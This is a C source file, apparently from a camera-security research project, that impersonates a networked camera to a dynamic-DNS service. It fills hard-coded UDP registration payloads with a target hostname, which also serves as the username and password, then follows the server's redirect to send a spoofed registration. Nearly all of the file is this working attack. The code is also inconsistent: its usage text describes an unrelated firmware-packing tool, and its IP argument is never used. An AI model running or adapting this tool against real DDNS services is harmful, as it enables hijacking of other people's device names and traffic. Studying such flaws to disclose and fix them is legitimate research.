/*
 * Copyright 2013 Artem Harutyunyan, Sergey Shekyan
 *
 *  Licensed under the Apache License, Version 2.0 (the "License");
 *  you may not use this file except in compliance with the License.
 *  You may obtain a copy of the License at
 *
 *      http://www.apache.org/licenses/LICENSE-2.0
 *
 *  Unless required by applicable law or agreed to in writing, software
 *  distributed under the License is distributed on an "AS IS" BASIS,
 *  WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 *  See the License for the specific language governing permissions and
 *  limitations under the License.
 *
 */

#include <string.h>
#include <getopt.h>
#include <stdio.h>
#include <stdlib.h>

#include <sys/errno.h>
#include <arpa/inet.h>
#include <netdb.h>

#include "camtool.h"

#define IP_BUF_LEN 16
#define RESP_BUF_LEN 1024
#define PORT_BUF_LEN 6

#define UNAME_LEN 6
#define DELIM 0x1

#define REQ_POS_PID 1
#define REQ_POS_UNAME 2
#define REQ_POS_PWD 3
#define REQ_POS_OEM  4
#define REQ_POS_DOMAIN_COUNT 5
#define REQ_POS_DOMAIN_0 6

#define RES_POS_PID 1
#define RES_POS_ERROR 2
#define RES_POS_MSG 3
#define RES_POS_DOMAIN_COUNT 4 
#define RES_POS_DOMAIN_0 5
#define RES_ENT_SRV_COUNT 6 
#define RES_ENT_SRV_0 7
#define RES_ENT_SRV_MPORT_0 8
#define RES_ENT_SRV_APORT_0 9

#define KEY_PID "PID"
#define KEY_UNAME "UName"
#define KEY_PWD "PWD"
#define KEY_OEM "OEM"
#define KEY_DOMAIN_COUNT "DomainCount"
#define KEY_DOMAIN_0 "Domain0"
#define KEY_ENT_SRV_0 "EntServer0"
#define KEY_ENT_SRV_MPORT_0 "EntServerMPort0"

static char initial_payload[] = {
  0x01, 0x50, 0x49, 0x44, 0x3d, 0x31, 0x34, 0x01, 0x55, 0x4e, 0x61, 0x6d,
  0x65, 0x3d, 0x63, 0x68, 0x31, 0x32, 0x36, 0x36, 0x01, 0x50, 0x57, 0x44,
  0x3d, 0x63, 0x68, 0x31, 0x32, 0x36, 0x36, 0x01, 0x4f, 0x45, 0x4d, 0x3d,
  0x72, 0x65, 0x65, 0x63, 0x61, 0x6d, 0x01, 0x44, 0x6f, 0x6d, 0x61, 0x69,
  0x6e, 0x43, 0x6f, 0x75, 0x6e, 0x74, 0x3d, 0x31, 0x01, 0x44, 0x6f, 0x6d,
  0x61, 0x69, 0x6e, 0x30, 0x3d, 0x63, 0x68, 0x31, 0x32, 0x36, 0x36, 0x2e,
  0x6d, 0x79, 0x66, 0x6f, 0x73, 0x63, 0x61, 0x6d, 0x2e, 0x6f, 0x72, 0x67,
  0x01, 0x00
};

static const unsigned int n_initial_payload = 85;
static char redirect_payload[] = {
  0x01, 0x50, 0x49, 0x44, 0x3d, 0x31, 0x30, 0x01, 0x55, 0x4e, 0x61, 0x6d, 
  0x65, 0x3d, 0x63, 0x68, 0x31, 0x32, 0x36, 0x36, 0x01, 0x50, 0x57, 0x44, 
  0x3d, 0x63, 0x68, 0x31, 0x32, 0x36, 0x36, 0x01, 0x4f, 0x45, 0x4d, 0x3d, 
  0x72, 0x65, 0x65, 0x63, 0x61, 0x6d, 0x01, 0x4f, 0x53, 0x3d, 0x4c, 0x69, 
  0x6e, 0x75, 0x78, 0x01, 0x42, 0x75, 0x69, 0x6c, 0x64, 0x4e, 0x4f, 0x3d, 
  0x31, 0x33, 0x38, 0x30, 0x01, 0x44, 0x6f, 0x6d, 0x61, 0x69, 0x6e, 0x30, 
  0x3d, 0x63, 0x68, 0x31, 0x32, 0x36, 0x36, 0x2e, 0x6d, 0x79, 0x66, 0x6f, 
  0x73, 0x63, 0x61, 0x6d, 0x2e, 0x6f, 0x72, 0x67, 0x01, 0x0 
};
static const unsigned int n_redirect_payload = 93;

static int 
payload_get_offset_by_name(const char* name, const char buf[0], const unsigned int n_buf)
{
  const unsigned int n_name = strlen(name);
  unsigned int i_name = 0;
  unsigned int i = 0;

  while (i < n_buf) {
    while (name[i_name] == buf[i + i_name] && ((i + i_name) < n_buf) && (i_name < n_name))
      ++i_name;
  
  if (i_name == n_name)
    return i;
  else 
    i_name = 0;
  
  ++i;
 }

  return -1;
}

static int 
payload_insert_host(const char* host, const char* buf, const unsigned int n_buf) 
{
  
  unsigned int i = 0;
  unsigned int n_host = strlen(host);
  int offset = 0;

  // Make sure that hostname is exactly UNAME_LEN 
  while (i < n_host && (buf[++i] != DELIM)) {}
  if (i != (UNAME_LEN + 1)) return -1;

  // Insert hostname to payload 
  if ((offset = payload_get_offset_by_name(KEY_UNAME, buf, n_buf)) == -1) return 1;
  memmove((void*) &buf[offset + strlen(KEY_UNAME) + 1], (const void*) host, UNAME_LEN);

  // Insert pwd to payload 
  if ((offset = payload_get_offset_by_name(KEY_PWD, buf, n_buf)) == -1) return 1;
  memmove((void*) &buf[offset + strlen(KEY_PWD) + 1], (const void*) host, UNAME_LEN);

  // Insert domain to payload 
  if ((offset = payload_get_offset_by_name(KEY_DOMAIN_0, buf, n_buf)) == -1 || (offset + n_host) >= n_buf) return 1; 
  memmove((void*) &buf[offset + strlen(KEY_DOMAIN_0) + 1], (const void*) host, n_host);

  return 0;
}

static int 
payload_extract_ent_srv_0(const char** ip, unsigned int* n_ip, const char* payload, const unsigned int n_payload) 
{
    unsigned int offset = payload_get_offset_by_name(KEY_ENT_SRV_0, payload, n_payload);    
    const unsigned int n_key_ent_srv = strlen(KEY_ENT_SRV_0);
    if (memcmp(&payload[offset], KEY_ENT_SRV_0, n_key_ent_srv) != 0)
      return 1;
    
    offset += (n_key_ent_srv + 1); // +1 for '='
    unsigned int ip_offset = offset;
    while (offset < n_payload && payload[offset] != DELIM) 
      ++offset;

    if (offset == n_payload) 
      return 1;

    *ip = &payload[ip_offset];
    *n_ip = offset - ip_offset;

    return 0;
}

static int
payload_extract_ent_srv_port(const char** port_fwd, unsigned int* n_port_fwd, const char* payload, const unsigned int n_payload)
{
  unsigned int offset = payload_get_offset_by_name(KEY_ENT_SRV_MPORT_0, payload, n_payload);
  const unsigned int n_key_ent_srv_mport = strlen(KEY_ENT_SRV_MPORT_0);

  if (memcmp(&payload[offset], KEY_ENT_SRV_MPORT_0, n_key_ent_srv_mport) != 0)
    return 1;

  offset += (n_key_ent_srv_mport + 1); // +1 for '='
  unsigned int mport_offset = offset;
  
  while (offset < n_payload && payload[offset] != DELIM) 
      ++offset;

  if (offset == n_payload) 
    return 1;

  *port_fwd = &payload[mport_offset];
  *n_port_fwd = offset - mport_offset;

  return 0;
}

static int
send_udp_payload (const char* payload, const unsigned int n_payload, const char* host, const unsigned short port, int* sockfd, struct addrinfo** r)
{
    /* Create socket and get the data from DDNS server */
    struct addrinfo hints = {0};
    struct addrinfo* res = *r;
    int ret = 0;
    int nbytes = 0;


    hints.ai_family = AF_INET;
    hints.ai_socktype = SOCK_DGRAM;

    if ((ret = getaddrinfo(host, NULL, &hints, &res)) != 0) {
      fprintf(stderr, "getaddrinfo: %s\n", gai_strerror(ret));
      return 1;
    }
 
    if ((*sockfd = socket(res->ai_family, res->ai_socktype, res->ai_protocol)) == -1) {
      fprintf(stderr, "socket() failed: %s\n", strerror(errno));
      return 1;
    }
      
    struct sockaddr_in *ipv4 = (struct sockaddr_in*) res->ai_addr;
    ipv4->sin_port = htons(port);

    /* Send the request */
    if ((nbytes = sendto(*sockfd, payload, n_payload, 0, res->ai_addr, sizeof *(res->ai_addr))) != n_payload) {
      fprintf(stderr, "sendto() failed: %s\n", strerror(errno));
      return 1;
    }
  
    *r = res;
    return 0;
}

static void 
usage()
{
    fprintf(stdout,
            "Tool for packing WebUI firmware.\n"
            "Usage: uipack -d <dir> -o <output file>\n"
            "\t-s DDNS server name\n"
            "\t-a camera hostname\n"
            "\t-i IP address to register\n"
            "\t-h print this message\n");
}

int 
main( int argc, char** argv) 
{

    if (argc < 4) {
        usage();
        return 1;
    }


    char ddns[MAX_HOSTNAME_LEN] = {0};
    char camera_name[MAX_HOSTNAME_LEN] = {0};
    char ip[IP_BUF_LEN] = {0};

    char o = 0;
    while ((o = getopt(argc, argv, ":s:a:i:h")) != -1) {
        switch(o) {
        case 's':
            if (strlen(optarg) > MAX_HOSTNAME_LEN - 1) {
                fprintf(stderr, "%s can not be longer than %d\n", optarg, MAX_HOSTNAME_LEN - 1);
                return 1;
            }
            strncpy(ddns, optarg, MAX_HOSTNAME_LEN);
            break;
        case 'a':
            if (strlen(optarg) > MAX_HOSTNAME_LEN - 1) {
                fprintf(stderr, "%s can not be longer than %d\n", optarg, MAX_HOSTNAME_LEN - 1);
                return 1;
            }
            strncpy(camera_name, optarg, MAX_HOSTNAME_LEN);
            break;
        case 'i':
            if (strlen(optarg) > IP_BUF_LEN - 1) {
                fprintf(stderr, "%s can not be longer than %d\n", optarg, IP_BUF_LEN - 1);
                return 1;
            }
            strncpy(ip, optarg, IP_BUF_LEN);
            break;
        case 'h':
            usage();
            return 0;
        case '?':
            fprintf(stderr, "Illegal option -%c\n", optopt);
            usage();
            return 1;
        defalt:
            fprintf(stderr, "Option -%c requires an argument.\n", optopt);
            usage();
            return 1;
        }
    }

    if (strlen(ddns) == 0|| strlen(camera_name) == 0 || strlen(ip) == 0) { 
        usage();
        return 1;
    }
   
    /* Insert hostname into payload */
    if (payload_insert_host(camera_name, initial_payload, n_initial_payload) != 0) {
      fprintf(stderr, "Could not insert hostname into the payload");
      return 1;
    }
  
    /* Send payload to DDNS */
    int sockfd = 0;
    struct addrinfo* res = NULL;
    if (send_udp_payload (initial_payload, n_initial_payload, ddns, 8080, &sockfd, &res) != 0) {
      fprintf(stderr, "Could not send UDP payload to %s", ddns);
      return 1;
    }

    /* Get the response */
    char resp[RESP_BUF_LEN] = {0};
    int n_resp;
    unsigned int fromlen = sizeof *(res->ai_addr);
    if ((n_resp = recvfrom(sockfd, resp, RESP_BUF_LEN, 0, res->ai_addr, &fromlen)) == -1) {
      fprintf(stderr, "recvfrom() failed: %s\n", strerror(errno));
      return 1;
    }
    fprintf(stderr, "Got %d bytes\n", n_resp); 
    freeaddrinfo(res);

    /* Make sure it's a redirect */

    /* Extract the server name */
    const char* ip_fwd = NULL;
    unsigned int n_ip_fwd = 0;;
    char str_ip_fwd[IP_BUF_LEN] = {0};
    if (payload_extract_ent_srv_0(&ip_fwd, &n_ip_fwd, resp, n_resp) != 0) {
      fprintf(stderr, "Could not extract IP server from the response\n");
      return 1;
    }
    memmove(str_ip_fwd, ip_fwd, n_ip_fwd);
    fprintf(stderr, "IP of the redirect server is: %s\n", str_ip_fwd); 

    /* Extract port */ 
    const char* port_fwd = 0;
    unsigned int n_port_fwd = 0;
    char str_port_fwd[PORT_BUF_LEN] = {0};
    if (payload_extract_ent_srv_port(&port_fwd, &n_port_fwd, resp, n_resp) != 0) {
      fprintf(stderr, "Could not extract port from the response\n");
      return 1;
    }
    memmove(str_port_fwd, port_fwd, n_port_fwd);
    fprintf(stderr, "Port of the redirect server is: %s\n", str_port_fwd);
   

    /* Update redirect payload and send to DDNS */
    if (payload_insert_host(camera_name, redirect_payload, n_redirect_payload) != 0) {
      fprintf(stderr, "Could not insert hostname into the redirect payload");
      return 1;
    }
  
    sockfd = 0;
    res = NULL;
    if (send_udp_payload(redirect_payload, n_redirect_payload, str_ip_fwd, atoi(str_port_fwd), &sockfd, &res) != 0) {
      fprintf(stderr, "Could not send UDP payload to %s", str_ip_fwd);
      return 1;
    }

    return 0;
}


